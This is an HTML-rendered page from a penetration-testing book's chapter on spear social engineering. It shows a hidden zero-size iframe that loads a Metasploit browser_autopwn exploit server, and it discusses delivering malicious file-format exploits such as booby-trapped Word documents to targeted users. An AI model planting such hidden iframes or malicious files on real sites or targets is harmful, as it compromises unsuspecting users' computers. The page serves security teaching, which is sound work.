<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfdc" class="pf w2 h2" data-page-no="dc"><div class="pc pcdc w2 h2"><img class="bi xaf y14ff w4 h62" alt="" src="bgdc.png"/><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 6: Spear Social Engineering<span class="_ _9"> </span><span class="ff1 fs9 lsa">197</span></div><div class="t m0 x3 hd y1500 ff4 fs7 fc0 sc0 ls0 ws0">width are set to 0. <span class="_ _3"/>Y<span class="_ _3"/>ou can also see that the location of the bro<span class="_ _0"/>wser_autopwn server </div><div class="t m0 x3 hd y1501 ff4 fs7 fc0 sc0 ls0 ws0">in this case is on a separate port of 8080.</div><div class="t m0 x3 h44 y1502 fff fse fc0 sc0 ls0 ws0">&lt;iframe src="http://192.168.1.25:8080/" height="0" width="0"&gt; &lt;/</div><div class="t m0 x3 h44 y1503 fff fse fc0 sc0 ls0 ws0">iframe&gt;</div><div class="t m0 x3 h7 y1504 ff1 fs3 fc0 sc0 ls0 ws0">File Format Exploits</div><div class="t m0 x3 hd y1505 ff4 fs7 fc0 sc0 ls0 ws0">File format exploits tak<span class="_ _0"/>e advantage of vulnerabilities in a program’<span class="_ _2"/>s interaction with </div><div class="t m0 x3 hd y1506 ff4 fs7 fc0 sc0 ls0 ws0">related les. For e<span class="_ _0"/>xample, a le format exploit for <span class="_ _0"/>W<span class="_ _3"/>ord documents would exploit </div><div class="t m0 x3 hd y1507 ff4 fs7 fc0 sc0 ls0 ws0">the Microsoft <span class="_ _0"/>W<span class="_ _3"/>ord program on our target user’<span class="_ _2"/>s workstation. Thus, we need to </div><div class="t m0 x3 hd y1508 ff4 fs7 fc0 sc0 ls0 ws0">create a “malicious” le and get our users to access that le from a system running </div><div class="t m0 x3 hd y1509 ff4 fs7 fc0 sc0 ls0 ws0">the vulnerable software. Remember from pre<span class="_ _0"/>vious sections that we should ha<span class="_ _0"/>ve </div><div class="t m0 x3 hd y150a ff4 fs7 fc0 sc0 ls0 ws0">guaranteed our success by verifying the softw<span class="_ _0"/>are and version the user has on their </div><div class="t m0 x3 hd y150b ff4 fs7 fc0 sc0 ls0 ws0">system.</div><div class="t m0 x4 hd y150c ff4 fs7 fc0 sc0 ls0 ws0">Ho<span class="_ _0"/>w we get the infected le to the end user depends on the specic scenario. </div><div class="t m0 x3 hd y150d ff4 fs7 fc0 sc0 lsb ws16">There has been so much hype and education for end users to be suspicious of e-mail </div><div class="t m0 x3 hd y150e ff4 fs7 fc0 sc0 ls0 ws0">attachments that e-mailing might not be our best option. In addition to the increasing </div><div class="t m0 x3 hd y150f ff4 fs7 fc0 sc0 ls0 ws0">education of users are the adv<span class="_ _0"/>ances in antispam software, which has a decent chance </div><div class="t m0 x3 hd y1510 ff4 fs7 fc0 sc0 ls0 ws0">of agging and blocking our attachment. <span class="_ _2"/>Although le format exploits might not be </div><div class="t m0 x3 hd y1511 ff4 fs7 fc0 sc0 ls0 ws0">our best option, it is still a viable option. <span class="_ _2"/>At the time of this writing, there were 142 </div><div class="t m0 x3 hd y1512 ff4 fs7 fc0 sc0 ls0 ws0">indi<span class="_ _0"/>vidual le format exploits for <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws alone in Metasploit.</div><div class="t m0 x3 h21 y1513 ff1 fs2 fc0 sc0 ls0 ws0">Figure 6-2<span class="_ _21"> </span><span class="ffc">Metasploit browser_autopwn as seen from a user’<span class="_ _3"/>s browser</span></div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>
